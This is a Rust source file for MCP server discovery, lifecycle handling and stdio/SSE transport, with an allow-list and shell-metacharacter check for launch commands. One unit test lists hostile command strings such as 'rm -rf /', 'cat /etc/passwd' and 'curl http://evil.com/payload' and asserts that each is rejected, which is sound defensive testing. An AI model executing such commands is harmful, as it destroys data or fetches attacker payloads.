use std::fs;
use std::io::{BufRead, BufReader, Write};
use std::path::{Path, PathBuf};
use std::process::{Child, Command, Stdio};
use std::sync::Mutex;

use octocode_core::{
    McpServerDescriptor, McpServerState, McpServerStatus, McpTransportKind,
};

pub struct McpRegistry {
    servers: Vec<McpServerStatus>,
}

pub struct McpLifecycleMachine;

impl McpRegistry {
    pub fn discover(workspace_root: &str, config_home: &str) -> Result<Self, String> {
        let candidate_dirs = [
            PathBuf::from(workspace_root).join(".octocode").join("mcp"),
            PathBuf::from(workspace_root).join("mcp"),
            PathBuf::from(config_home).join("mcp"),
        ];
        let mut servers = Vec::new();

        for dir in candidate_dirs {
            if !dir.is_dir() {
                continue;
            }
            let entries = fs::read_dir(&dir)
                .map_err(|error| format!("failed to read MCP dir {}: {error}", dir.display()))?;
            for entry in entries {
                let entry = entry.map_err(|error| {
                    format!("failed to read MCP entry in {}: {error}", dir.display())
                })?;
                let path = entry.path();
                if !path.is_file() || !is_manifest_candidate(&path) {
                    continue;
                }
                match parse_manifest(&path) {
                    Ok(status) => servers.push(status),
                    Err(error) => servers.push(McpServerStatus {
                        descriptor: McpServerDescriptor {
                            id: path
                                .file_stem()
                                .and_then(|value| value.to_str())
                                .unwrap_or("unknown")
                                .to_string(),
                            transport: McpTransportKind::Stdio,
                            command: None,
                            endpoint: None,
                            description: Some(String::from("invalid MCP manifest")),
                            manifest_path: path.display().to_string(),
                            trusted: false,
                        },
                        state: McpServerState::Failed,
                        detail: error,
                    }),
                }
            }
        }

        servers.sort_by(|left, right| left.descriptor.id.cmp(&right.descriptor.id));
        servers.dedup_by(|left, right| left.descriptor.id == right.descriptor.id);
        Ok(Self { servers })
    }

    pub fn servers(&self) -> &[McpServerStatus] {
        &self.servers
    }

    pub fn servers_mut(&mut self) -> &mut Vec<McpServerStatus> {
        &mut self.servers
    }

    pub fn into_servers(self) -> Vec<McpServerStatus> {
        self.servers
    }
}

impl McpLifecycleMachine {
    pub fn transition(
        status: &mut McpServerStatus,
        next: McpServerState,
    ) -> Result<(), String> {
        if !can_transition(&status.state, &next) {
            return Err(format!(
                "invalid MCP lifecycle transition: {} -> {}",
                status.state.as_str(),
                next.as_str()
            ));
        }

        status.state = next.clone();
        status.detail = match next {
            McpServerState::Discovered => String::from("manifest discovered"),
            McpServerState::TrustRequired => String::from("awaiting explicit trust"),
            McpServerState::ReadyForPrompt => String::from("validated and ready for prompt"),
            McpServerState::Spawning => String::from("launching MCP server process"),
            McpServerState::Running => String::from("MCP server ready and accepting prompts"),
            McpServerState::Failed => String::from("MCP server failed validation or launch"),
            McpServerState::Disabled => String::from("MCP server disabled"),
        };
        Ok(())
    }
}

// ─── MCP Command Security ──────────────────────────────────────────────────────

/// Whitelist of allowed MCP server programs.
/// Only programs in this list may be spawned as MCP server processes.
const ALLOWED_MCP_PROGRAMS: &[&str] = &[
    "node", "npx", "python", "python3", "python3.exe", "python.exe",
    "deno", "bun", "uvx", "cargo", "cargo.exe",
    "node.exe", "npx.cmd", "deno.exe", "bun.exe",
];

/// Shell metacharacters that indicate potential injection attacks.
const SHELL_META_CHARS: &[char] = &[
    '|', '&', ';', '$', '`', '(', ')', '{', '}', '<', '>', '\n', '\r',
];

/// Validate that an MCP command is safe to execute.
fn validate_mcp_command(command_str: &str) -> Result<(), String> {
    if command_str.trim().is_empty() {
        return Err("empty MCP command".into());
    }

    // Reject shell metacharacters to prevent injection
    if command_str.chars().any(|c| SHELL_META_CHARS.contains(&c)) {
        return Err(format!(
            "MCP command contains forbidden shell metacharacters: {}",
            command_str
        ));
    }

    let parts: Vec<&str> = command_str.split_whitespace().collect();
    let program = parts.first().copied().unwrap_or("");

    // Extract base program name (strip path components)
    let base_name = Path::new(program)
        .file_name()
        .and_then(|n| n.to_str())
        .unwrap_or(program);

    if !ALLOWED_MCP_PROGRAMS.contains(&base_name) {
        return Err(format!(
            "MCP program '{}' is not in the allowed list. Allowed: {:?}",
            base_name, ALLOWED_MCP_PROGRAMS
        ));
    }

    Ok(())
}

// ─── MCP Stdio Transport ───────────────────────────────────────────────────────

pub struct McpTransport {
    child: Option<Child>,
    pub server_id: String,
}

impl McpTransport {
    /// Spawn a child process for a stdio MCP server.
    pub fn spawn(status: &mut McpServerStatus, working_dir: &str) -> Result<Self, String> {
        let command_str = status
            .descriptor
            .command
            .clone()
            .ok_or_else(|| format!("MCP server {} has no command", status.descriptor.id))?;

        // Security: validate command before execution
        validate_mcp_command(&command_str)?;

        McpLifecycleMachine::transition(status, McpServerState::Spawning)?;

        let parts: Vec<&str> = command_str.split_whitespace().collect();
        if parts.is_empty() {
            McpLifecycleMachine::transition(status, McpServerState::Failed)?;
            return Err("empty MCP command".into());
        }

        let program = parts[0];
        let args = &parts[1..];

        match Command::new(program)
            .args(args)
            .current_dir(working_dir)
            .stdin(Stdio::piped())
            .stdout(Stdio::piped())
            .stderr(Stdio::null())
            .spawn()
        {
            Ok(child) => {
                McpLifecycleMachine::transition(status, McpServerState::Running)?;
                Ok(Self {
                    child: Some(child),
                    server_id: status.descriptor.id.clone(),
                })
            }
            Err(err) => {
                status.detail = format!("spawn failed: {err}");
                McpLifecycleMachine::transition(status, McpServerState::Failed)?;
                Err(format!("failed to spawn MCP server {}: {err}", status.descriptor.id))
            }
        }
    }

    /// Send a JSON-RPC request and read one JSON-RPC response line.
    pub fn call(&mut self, method: &str, params: &str) -> Result<String, String> {
        let child = self
            .child
            .as_mut()
            .ok_or_else(|| "MCP transport not connected".to_string())?;

        let request = format!(
            "{{\"jsonrpc\":\"2.0\",\"id\":1,\"method\":\"{}\",\"params\":{}}}",
            method, params
        );

        let stdin = child
            .stdin
            .as_mut()
            .ok_or_else(|| "stdin not available".to_string())?;
        let header = format!("Content-Length: {}\r\n\r\n", request.len());
        stdin
            .write_all(header.as_bytes())
            .map_err(|e| format!("stdin write header: {e}"))?;
        stdin
            .write_all(request.as_bytes())
            .map_err(|e| format!("stdin write body: {e}"))?;
        stdin.flush().map_err(|e| format!("stdin flush: {e}"))?;

        let stdout = child
            .stdout
            .as_mut()
            .ok_or_else(|| "stdout not available".to_string())?;
        let mut reader = BufReader::new(stdout);

        // Read Content-Length header
        let mut header_line = String::new();
        reader
            .read_line(&mut header_line)
            .map_err(|e| format!("read header: {e}"))?;
        let content_length: usize = header_line
            .trim()
            .strip_prefix("Content-Length:")
            .or_else(|| header_line.trim().strip_prefix("content-length:"))
            .map(|v| v.trim().parse().unwrap_or(0))
            .unwrap_or(0);

        // Read blank separator
        let mut blank = String::new();
        let _ = reader.read_line(&mut blank);

        // Read body
        if content_length > 0 {
            // Cap at 10 MB to prevent OOM from malicious servers.
            const MAX_MCP_RESPONSE_SIZE: usize = 10 * 1024 * 1024;
            if content_length > MAX_MCP_RESPONSE_SIZE {
                return Err(format!(
                    "MCP response too large: {} bytes (max {})",
                    content_length, MAX_MCP_RESPONSE_SIZE
                ));
            }
            let mut body = vec![0u8; content_length];
            use std::io::Read;
            reader
                .read_exact(&mut body)
                .map_err(|e| format!("read body: {e}"))?;
            String::from_utf8(body).map_err(|e| format!("utf8: {e}"))
        } else {
            // Fallback: read one line
            let mut line = String::new();
            reader
                .read_line(&mut line)
                .map_err(|e| format!("read line: {e}"))?;
            Ok(line)
        }
    }

    /// Check if child is still running.
    pub fn is_alive(&mut self) -> bool {
        self.child
            .as_mut()
            .map(|c| c.try_wait().ok().flatten().is_none())
            .unwrap_or(false)
    }

    /// Kill the child process.
    pub fn kill(&mut self) {
        if let Some(ref mut child) = self.child {
            let _ = child.kill();
            let _ = child.wait();
        }
        self.child = None;
    }
}

impl Drop for McpTransport {
    fn drop(&mut self) {
        self.kill();
    }
}

// ─── MCP SSE Transport ─────────────────────────────────────────────────────────

/// SSE (Server-Sent Events) transport for MCP servers.
/// Connects to an HTTP endpoint that streams events via SSE protocol,
/// and sends requests via POST to a companion endpoint.
pub struct McpSseTransport {
    /// The SSE endpoint URL to read events from.
    pub sse_url: String,
    /// The POST endpoint URL to send JSON-RPC requests to.
    pub post_url: String,
    pub server_id: String,
    /// Buffered events received from the SSE stream.
    event_buffer: Mutex<Vec<SseEvent>>,
    connected: std::sync::atomic::AtomicBool,
}

/// A single SSE event parsed from the stream.
#[derive(Debug, Clone)]
pub struct SseEvent {
    pub event_type: String,
    pub data: String,
    pub id: Option<String>,
}

impl McpSseTransport {
    /// Create a new SSE transport for a given server.
    /// `sse_url` is the endpoint that streams events.
    /// `post_url` is the endpoint to send JSON-RPC requests to (defaults to sse_url + "/message").
    pub fn new(server_id: &str, sse_url: &str, post_url: Option<&str>) -> Self {
        let resolved_post_url = post_url
            .map(String::from)
            .unwrap_or_else(|| format!("{}/message", sse_url.trim_end_matches('/')));
        Self {
            sse_url: sse_url.to_string(),
            post_url: resolved_post_url,
            server_id: server_id.to_string(),
            event_buffer: Mutex::new(Vec::new()),
            connected: std::sync::atomic::AtomicBool::new(false),
        }
    }

    /// Connect to the SSE endpoint and perform initial handshake.
    /// Returns Ok(()) if the connection was established successfully.
    pub fn connect(&self) -> Result<(), String> {
        // Perform a GET to the SSE endpoint to verify connectivity
        let response = ureq::get(&self.sse_url)
            .set("Accept", "text/event-stream")
            .set("Cache-Control", "no-cache")
            .call()
            .map_err(|e| format!("SSE connect failed for {}: {e}", self.server_id))?;

        if response.status() != 200 {
            return Err(format!(
                "SSE endpoint returned status {} for {}",
                response.status(),
                self.server_id
            ));
        }

        // Read initial events (server info, capabilities)
        let body = response
            .into_string()
            .map_err(|e| format!("SSE read body: {e}"))?;

        let events = parse_sse_stream(&body);
        if let Ok(mut buffer) = self.event_buffer.lock() {
            buffer.extend(events);
        }

        self.connected.store(true, std::sync::atomic::Ordering::SeqCst);
        Ok(())
    }

    /// Send a JSON-RPC request via POST and return the response.
    pub fn call(&self, method: &str, params: &str) -> Result<String, String> {
        if !self.connected.load(std::sync::atomic::Ordering::SeqCst) {
            return Err(format!("SSE transport not connected for {}", self.server_id));
        }

        let request_body = format!(
            "{{\"jsonrpc\":\"2.0\",\"id\":1,\"method\":\"{}\",\"params\":{}}}",
            method, params
        );

        let response = ureq::post(&self.post_url)
            .set("Content-Type", "application/json")
            .send_string(&request_body)
            .map_err(|e| format!("SSE POST failed for {}: {e}", self.server_id))?;

        if response.status() != 200 && response.status() != 202 {
            return Err(format!(
                "SSE POST returned status {} for {}",
                response.status(),
                self.server_id
            ));
        }

        response
            .into_string()
            .map_err(|e| format!("SSE response read: {e}"))
    }

    /// Get buffered events from the SSE stream.
    pub fn drain_events(&self) -> Vec<SseEvent> {
        self.event_buffer
            .lock()
            .map(|mut buf| std::mem::take(&mut *buf))
            .unwrap_or_default()
    }

    /// Check if the transport is connected.
    pub fn is_connected(&self) -> bool {
        self.connected.load(std::sync::atomic::Ordering::SeqCst)
    }

    /// Disconnect and clean up.
    pub fn disconnect(&self) {
        self.connected.store(false, std::sync::atomic::Ordering::SeqCst);
        if let Ok(mut buf) = self.event_buffer.lock() {
            buf.clear();
        }
    }
}

/// Parse a raw SSE stream body into individual events.
fn parse_sse_stream(raw: &str) -> Vec<SseEvent> {
    let mut events = Vec::new();
    let mut current_type = String::from("message");
    let mut current_data = String::new();
    let mut current_id: Option<String> = None;

    for line in raw.lines() {
        if line.is_empty() {
            // Empty line = event boundary
            if !current_data.is_empty() {
                events.push(SseEvent {
                    event_type: current_type.clone(),
                    data: current_data.trim_end().to_string(),
                    id: current_id.take(),
                });
                current_data.clear();
                current_type = String::from("message");
            }
            continue;
        }

        if let Some(value) = line.strip_prefix("event:") {
            current_type = value.trim().to_string();
        } else if let Some(value) = line.strip_prefix("data:") {
            if !current_data.is_empty() {
                current_data.push('\n');
            }
            current_data.push_str(value.trim_start());
        } else if let Some(value) = line.strip_prefix("id:") {
            current_id = Some(value.trim().to_string());
        }
        // Ignore "retry:" and comment lines starting with ":"
    }

    // Final event if no trailing blank line
    if !current_data.is_empty() {
        events.push(SseEvent {
            event_type: current_type,
            data: current_data.trim_end().to_string(),
            id: current_id,
        });
    }

    events
}

/// Manages multiple MCP transports.
pub struct McpTransportManager {
    transports: Mutex<Vec<McpTransport>>,
    sse_transports: Mutex<Vec<McpSseTransport>>,
}

impl Default for McpTransportManager {
    fn default() -> Self {
        Self {
            transports: Mutex::new(Vec::new()),
            sse_transports: Mutex::new(Vec::new()),
        }
    }
}

impl McpTransportManager {
    pub fn new() -> Self {
        Self::default()
    }

    /// Spawn all trusted MCP servers (stdio + SSE) from a registry.
    pub fn spawn_trusted(
        &self,
        registry: &mut McpRegistry,
        working_dir: &str,
    ) -> Vec<String> {
        let mut spawned = Vec::new();
        for status in registry.servers_mut() {
            if status.state != McpServerState::ReadyForPrompt {
                continue;
            }
            match status.descriptor.transport {
                McpTransportKind::Stdio => {
                    if status.descriptor.command.is_none() {
                        continue;
                    }
                    match McpTransport::spawn(status, working_dir) {
                        Ok(transport) => {
                            spawned.push(transport.server_id.clone());
                            if let Ok(mut transports) = self.transports.lock() {
                                transports.push(transport);
                            }
                        }
                        Err(err) => {
                            eprintln!("MCP stdio spawn error for {}: {err}", status.descriptor.id);
                        }
                    }
                }
                McpTransportKind::Sse => {
                    let endpoint = match &status.descriptor.endpoint {
                        Some(url) => url.clone(),
                        None => continue,
                    };
                    let transport = McpSseTransport::new(
                        &status.descriptor.id,
                        &endpoint,
                        None,
                    );
                    match transport.connect() {
                        Ok(()) => {
                            McpLifecycleMachine::transition(status, McpServerState::Running)
                                .unwrap_or(());
                            spawned.push(transport.server_id.clone());
                            if let Ok(mut sse) = self.sse_transports.lock() {
                                sse.push(transport);
                            }
                        }
                        Err(err) => {
                            status.detail = format!("SSE connect failed: {err}");
                            McpLifecycleMachine::transition(status, McpServerState::Failed)
                                .unwrap_or(());
                            eprintln!("MCP SSE connect error for {}: {err}", status.descriptor.id);
                        }
                    }
                }
                _ => continue,
            }
        }
        spawned
    }

    /// Call a method on a specific MCP server (stdio or SSE).
    pub fn call(&self, server_id: &str, method: &str, params: &str) -> Result<String, String> {
        // Try stdio transports first
        if let Ok(mut transports) = self.transports.lock() {
            if let Some(transport) = transports.iter_mut().find(|t| t.server_id == server_id) {
                return transport.call(method, params);
            }
        }
        // Try SSE transports
        if let Ok(sse_transports) = self.sse_transports.lock() {
            if let Some(transport) = sse_transports.iter().find(|t| t.server_id == server_id) {
                return transport.call(method, params);
            }
        }
        Err(format!("MCP server {server_id} not connected"))
    }

    /// Shutdown all transports (stdio + SSE).
    pub fn shutdown(&self) {
        if let Ok(mut transports) = self.transports.lock() {
            for transport in transports.iter_mut() {
                transport.kill();
            }
            transports.clear();
        }
        if let Ok(sse) = self.sse_transports.lock() {
            for transport in sse.iter() {
                transport.disconnect();
            }
        }
        if let Ok(mut sse) = self.sse_transports.lock() {
            sse.clear();
        }
    }

    pub fn active_count(&self) -> usize {
        let stdio = self.transports.lock().map(|t| t.len()).unwrap_or(0);
        let sse = self.sse_transports.lock().map(|t| t.len()).unwrap_or(0);
        stdio + sse
    }
}

fn is_manifest_candidate(path: &Path) -> bool {
    matches!(
        path.extension().and_then(|value| value.to_str()),
        Some("conf") | Some("mcp") | Some("toml") | Some("txt")
    )
}

fn parse_manifest(path: &Path) -> Result<McpServerStatus, String> {
    let raw = fs::read_to_string(path)
        .map_err(|error| format!("failed to read manifest {}: {error}", path.display()))?;
    let mut id = path
        .file_stem()
        .and_then(|value| value.to_str())
        .unwrap_or("mcp-server")
        .to_string();
    let mut transport = McpTransportKind::Stdio;
    let mut command = None;
    let mut endpoint = None;
    let mut description = None;
    let mut trusted = false;

    for line in raw.lines() {
        let trimmed = line.trim();
        if trimmed.is_empty() || trimmed.starts_with('#') {
            continue;
        }
        let pair = trimmed
            .split_once('=')
            .or_else(|| trimmed.split_once(':'));
        let Some((key, value)) = pair else {
            continue;
        };
        let value = value.trim().trim_matches('"').trim_matches('\'');
        match key.trim() {
            "id" => id = value.to_string(),
            "transport" => transport = McpTransportKind::parse(value),
            "command" => command = Some(value.to_string()),
            "endpoint" | "url" => endpoint = Some(value.to_string()),
            "description" | "summary" => description = Some(value.to_string()),
            "trusted" => trusted = matches!(value, "1" | "true" | "yes" | "on"),
            _ => {}
        }
    }

    if command.is_none() && endpoint.is_none() {
        return Err(format!(
            "manifest {} must define command or endpoint",
            path.display()
        ));
    }

    let state = if trusted {
        McpServerState::ReadyForPrompt
    } else {
        McpServerState::TrustRequired
    };

    Ok(McpServerStatus {
        descriptor: McpServerDescriptor {
            id,
            transport,
            command,
            endpoint,
            description,
            manifest_path: path.display().to_string(),
            trusted,
        },
        state: state.clone(),
        detail: match state {
            McpServerState::ReadyForPrompt => String::from("manifest discovered and trusted"),
            _ => String::from("manifest discovered and awaiting trust"),
        },
    })
}

fn can_transition(current: &McpServerState, next: &McpServerState) -> bool {
    current == next
        || matches!(
            (current, next),
            (McpServerState::Disabled, McpServerState::Discovered)
                | (McpServerState::Discovered, McpServerState::TrustRequired)
                | (McpServerState::Discovered, McpServerState::ReadyForPrompt)
                | (McpServerState::Discovered, McpServerState::Spawning)
                | (McpServerState::TrustRequired, McpServerState::ReadyForPrompt)
                | (McpServerState::TrustRequired, McpServerState::Failed)
                | (McpServerState::ReadyForPrompt, McpServerState::Spawning)
                | (McpServerState::ReadyForPrompt, McpServerState::Running)
                | (McpServerState::ReadyForPrompt, McpServerState::Failed)
                | (McpServerState::Spawning, McpServerState::Running)
                | (McpServerState::Spawning, McpServerState::Failed)
                | (McpServerState::Running, McpServerState::ReadyForPrompt)
                | (McpServerState::Running, McpServerState::Failed)
                | (McpServerState::Failed, McpServerState::TrustRequired)
                | (McpServerState::Failed, McpServerState::ReadyForPrompt)
                | (McpServerState::Failed, McpServerState::Spawning)
        )
}

#[cfg(test)]
mod tests {
    use super::{McpLifecycleMachine, McpRegistry, McpTransport, McpTransportManager};
    use octocode_core::{McpServerState, McpTransportKind};
    use std::fs;
    use std::path::PathBuf;
    use std::time::{SystemTime, UNIX_EPOCH};

    fn unique_path(suffix: &str) -> PathBuf {
        let stamp = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .expect("system time")
            .as_nanos();
        std::env::temp_dir().join(format!("octocode-mcp-{suffix}-{stamp}"))
    }

    #[test]
    fn discovers_mcp_manifest_from_workspace_dir() {
        let workspace_root = unique_path("workspace");
        let config_root = unique_path("config");
        let manifest_dir = workspace_root.join(".octocode").join("mcp");
        fs::create_dir_all(&manifest_dir).expect("create manifest dir");
        fs::create_dir_all(&config_root).expect("create config dir");
        fs::write(
            manifest_dir.join("filesystem.conf"),
            "id=filesystem\ntransport=stdio\ncommand=node ./mcp.js\ntrusted=true\ndescription=workspace file bridge\n",
        )
        .expect("write manifest");

        let registry = McpRegistry::discover(
            workspace_root.to_str().expect("workspace path"),
            config_root.to_str().expect("config path"),
        )
        .expect("discover registry");

        assert_eq!(registry.servers().len(), 1);
        let status = &registry.servers()[0];
        assert_eq!(status.descriptor.id, "filesystem");
        assert_eq!(status.state, McpServerState::ReadyForPrompt);
        assert_eq!(status.descriptor.command.as_deref(), Some("node ./mcp.js"));

        let _ = fs::remove_dir_all(&workspace_root);
        let _ = fs::remove_dir_all(&config_root);
    }

    #[test]
    fn lifecycle_transitions_follow_expected_path() {
        let workspace_root = unique_path("workspace-state");
        let config_root = unique_path("config-state");
        let manifest_dir = config_root.join("mcp");
        fs::create_dir_all(&manifest_dir).expect("create config manifest dir");
        fs::write(
            manifest_dir.join("bridge.conf"),
            "id=bridge\ntransport=websocket\nendpoint=ws://127.0.0.1:7777\ntrusted=false\n",
        )
        .expect("write manifest");

        let mut status = McpRegistry::discover(
            workspace_root.to_str().expect("workspace path"),
            config_root.to_str().expect("config path"),
        )
        .expect("discover registry")
        .into_servers()
        .pop()
        .expect("one server discovered");
        assert_eq!(status.state, McpServerState::TrustRequired);

        McpLifecycleMachine::transition(&mut status, McpServerState::ReadyForPrompt)
            .expect("trust transition");
        McpLifecycleMachine::transition(&mut status, McpServerState::Spawning)
            .expect("spawn transition");
        McpLifecycleMachine::transition(&mut status, McpServerState::Running)
            .expect("running transition");
        assert_eq!(status.state, McpServerState::Running);

        let _ = fs::remove_dir_all(&workspace_root);
        let _ = fs::remove_dir_all(&config_root);
    }

    #[test]
    fn transport_spawn_fails_for_missing_command() {
        let mut status = octocode_core::McpServerStatus {
            descriptor: octocode_core::McpServerDescriptor {
                id: String::from("nocommand"),
                transport: McpTransportKind::Stdio,
                command: None,
                endpoint: None,
                description: None,
                manifest_path: String::from("/tmp/fake.conf"),
                trusted: true,
            },
            state: McpServerState::ReadyForPrompt,
            detail: String::from("ready"),
        };
        let result = McpTransport::spawn(&mut status, ".");
        assert!(result.is_err());
        let err = result.err().unwrap();
        assert!(err.contains("no command"), "expected 'no command' in error: {err}");
    }

    #[test]
    fn transport_spawn_fails_for_disallowed_binary() {
        let mut status = octocode_core::McpServerStatus {
            descriptor: octocode_core::McpServerDescriptor {
                id: String::from("bad-binary"),
                transport: McpTransportKind::Stdio,
                command: Some(String::from("__nonexistent_binary_for_test__ arg1")),
                endpoint: None,
                description: None,
                manifest_path: String::from("/tmp/fake.conf"),
                trusted: true,
            },
            state: McpServerState::ReadyForPrompt,
            detail: String::from("ready"),
        };
        let result = McpTransport::spawn(&mut status, ".");
        assert!(result.is_err(), "expected spawn to fail for disallowed binary");
        let err = result.err().unwrap();
        assert!(err.contains("not in the allowed list"), "expected allowed list error: {err}");
    }

    #[test]
    fn transport_manager_starts_empty() {
        let manager = McpTransportManager::new();
        assert_eq!(manager.active_count(), 0);
    }

    #[test]
    fn transport_manager_spawn_skips_non_stdio() {
        let workspace_root = unique_path("ws-mgr");
        let config_root = unique_path("cfg-mgr");
        let manifest_dir = workspace_root.join("mcp");
        fs::create_dir_all(&manifest_dir).expect("create dir");
        fs::create_dir_all(&config_root).expect("create dir");
        fs::write(
            manifest_dir.join("ws-server.conf"),
            "id=ws-server\ntransport=websocket\nendpoint=ws://127.0.0.1:9999\ntrusted=true\n",
        )
        .expect("write manifest");

        let mut registry = McpRegistry::discover(
            workspace_root.to_str().unwrap(),
            config_root.to_str().unwrap(),
        )
        .expect("discover");

        let manager = McpTransportManager::new();
        let spawned = manager.spawn_trusted(&mut registry, ".");
        assert!(spawned.is_empty(), "websocket servers should not be spawned");
        assert_eq!(manager.active_count(), 0);

        let _ = fs::remove_dir_all(&workspace_root);
        let _ = fs::remove_dir_all(&config_root);
    }

    #[test]
    fn transport_manager_call_nonexistent_server_fails() {
        let manager = McpTransportManager::new();
        let result = manager.call("nonexistent", "ping", "{}");
        assert!(result.is_err());
        assert!(result.unwrap_err().contains("not connected"));
    }

    #[test]
    fn validate_mcp_command_rejects_shell_injection() {
        use super::validate_mcp_command;

        // Allowed programs should pass
        assert!(validate_mcp_command("node server.js").is_ok());
        assert!(validate_mcp_command("python -m mcp_server").is_ok());
        assert!(validate_mcp_command("npx @modelcontextprotocol/server").is_ok());

        // Shell metacharacters should fail
        assert!(validate_mcp_command("node server.js; rm -rf /").is_err());
        assert!(validate_mcp_command("node server.js | cat /etc/passwd").is_err());
        assert!(validate_mcp_command("$(whoami)").is_err());
        assert!(validate_mcp_command("node `malicious`").is_err());
        assert!(validate_mcp_command("node server.js & background").is_err());

        // Non-whitelisted programs should fail
        assert!(validate_mcp_command("rm -rf /").is_err());
        assert!(validate_mcp_command("curl http://evil.com/payload").is_err());
        assert!(validate_mcp_command("/bin/bash -c evil").is_err());

        // Empty command should fail
        assert!(validate_mcp_command("").is_err());
        assert!(validate_mcp_command("   ").is_err());
    }

    #[test]
    fn parse_sse_stream_basic() {
        use super::parse_sse_stream;
        let raw = "event: endpoint\ndata: /message\n\ndata: {\"jsonrpc\":\"2.0\",\"result\":{}}\n\n";
        let events = parse_sse_stream(raw);
        assert_eq!(events.len(), 2);
        assert_eq!(events[0].event_type, "endpoint");
        assert_eq!(events[0].data, "/message");
        assert_eq!(events[1].event_type, "message");
        assert_eq!(events[1].data, "{\"jsonrpc\":\"2.0\",\"result\":{}}");
    }

    #[test]
    fn parse_sse_stream_multiline_data() {
        use super::parse_sse_stream;
        let raw = "data: line1\ndata: line2\ndata: line3\n\n";
        let events = parse_sse_stream(raw);
        assert_eq!(events.len(), 1);
        assert_eq!(events[0].data, "line1\nline2\nline3");
    }

    #[test]
    fn parse_sse_stream_with_id() {
        use super::parse_sse_stream;
        let raw = "id: 42\nevent: update\ndata: hello\n\n";
        let events = parse_sse_stream(raw);
        assert_eq!(events.len(), 1);
        assert_eq!(events[0].id.as_deref(), Some("42"));
        assert_eq!(events[0].event_type, "update");
    }

    #[test]
    fn sse_transport_not_connected_returns_error() {
        use super::McpSseTransport;
        let transport = McpSseTransport::new("test-server", "http://localhost:9999/sse", None);
        assert!(!transport.is_connected());
        let result = transport.call("ping", "{}");
        assert!(result.is_err());
        assert!(result.unwrap_err().contains("not connected"));
    }

    #[test]
    fn sse_transport_post_url_defaults() {
        use super::McpSseTransport;
        let t = McpSseTransport::new("srv", "http://localhost:8080/sse", None);
        assert_eq!(t.post_url, "http://localhost:8080/sse/message");

        let t2 = McpSseTransport::new("srv", "http://localhost:8080/sse/", Some("http://custom/post"));
        assert_eq!(t2.post_url, "http://custom/post");
    }

    #[test]
    fn transport_kind_parses_sse() {
        assert_eq!(McpTransportKind::parse("sse"), McpTransportKind::Sse);
        assert_eq!(McpTransportKind::parse("server-sent-events"), McpTransportKind::Sse);
        assert_eq!(McpTransportKind::Sse.as_str(), "sse");
    }
}
